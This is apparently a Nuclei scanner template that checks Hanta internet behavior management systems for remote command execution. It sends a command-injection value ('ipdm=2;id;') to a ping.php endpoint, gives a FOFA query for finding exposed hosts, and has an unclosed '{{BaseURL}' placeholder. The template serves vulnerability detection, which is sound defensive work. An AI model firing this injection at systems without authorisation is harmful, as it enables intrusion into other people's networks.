id: Hanta-Internet-behavior-management-system-RCE

info:
  name: Hanta-Internet-behavior-management-system-RCE
  author: momika233
  severity: high
  description: |
     Hanta-Internet-behavior-management-system-RCE
  reference:
    - https://www.github.com/momika233
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="汉塔科技上网行为管理系统"
  tags: Hanta,RCE

requests:
  - method: GET
    path:
      - "{{BaseURL}/dgn/dgn_tools/ping.php?ipdm=2;id;"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid=.*"
        part: body

      - type: status
        status:
          - 200
